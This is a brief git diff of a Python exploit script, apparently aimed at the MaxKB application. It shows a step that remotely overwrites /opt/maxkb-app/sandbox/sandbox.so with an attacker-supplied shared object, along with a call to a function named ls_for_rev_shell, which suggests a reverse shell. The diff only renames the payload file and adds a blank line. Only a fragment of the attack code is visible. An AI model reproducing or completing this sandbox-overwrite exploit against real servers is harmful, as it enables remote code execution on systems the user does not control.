@@ -125,7 +125,7 @@ def main():
     # Перезапись sandbox.so
     print("\n[+] Step 3: Remote sandbox.so Write")
     test_path = "/opt/maxkb-app/sandbox/sandbox.so"
-    with open("new_sandbox.so", "rb") as f:
+    with open("ls_sandbox.so", "rb") as f:
         raw = f.read()
 
     print(raw)
@@ -139,4 +139,5 @@ def main():
     read_back = ls_for_rev_shell()
 
 if __name__ == "__main__":
+
     main()
